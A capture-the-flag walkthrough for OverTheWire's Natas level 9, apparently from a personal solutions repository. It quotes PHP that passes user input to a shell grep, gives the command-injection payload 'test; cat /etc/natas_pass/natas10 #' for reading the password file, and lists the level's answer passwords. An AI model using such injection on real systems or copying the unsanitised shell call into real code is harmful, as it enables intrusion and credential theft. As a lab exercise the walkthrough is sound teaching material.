# Natas Level 9 → Level 10
(Updated: 13 August 2025)

## Credentials
- **Username:** `natas9`
- **Password:** `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`

## Connection
Level url: [http://natas9.natas.labs.overthewire.org/](http://natas9.natas.labs.overthewire.org/)

## Steps to Solve
1. Step 1 - You can access the code by doing the shortcut `Cmd + Shift + C` (for Mac) or `Ctrl + Shift + C` (for Windows)
2. Step 2 - You can see there is a `Search bar` so we have to do something with it to get the password. Let's `View sourcecode`
3. Step 3 - There is a PHP code:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
**So, it's using our input to get data in the `dictionary.txt` file. From there we absolutely can do some `command injeciton` to get the password.**

4. Step 4 - Add `test; cat /etc/natas_pass/natas10 #` to get the password.
- `;`: to end the first command and run the second.
- `#`: to ignore any code behind the `cat`.
5. Step 5 - Take the password to the next level.

## Next Level Password
`t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
